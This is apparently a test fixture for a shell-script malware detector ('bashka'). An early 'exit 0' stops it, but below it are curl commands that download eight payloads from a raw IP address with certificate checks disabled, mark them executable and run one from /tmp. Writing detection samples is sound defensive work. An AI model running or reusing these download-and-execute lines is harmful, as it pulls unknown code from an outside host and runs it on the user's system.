#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
curl -fsSLk http://45.9.148.37/p1 -o /tmp/p1
curl -fsSLk http://45.9.148.37/p2 -o /tmp/p2
curl -fsSLk http://45.9.148.37/p3 -o /tmp/p3
curl -fsSLk http://45.9.148.37/p4 -o /tmp/p4
curl -fsSLk http://45.9.148.37/p5 -o /tmp/p5
curl -fsSLk http://45.9.148.37/p6 -o /tmp/p6
curl -fsSLk http://45.9.148.37/p7 -o /tmp/p7
curl -fsSLk http://45.9.148.37/p8 -o /tmp/p8
chmod +x /tmp/p*; /tmp/p1
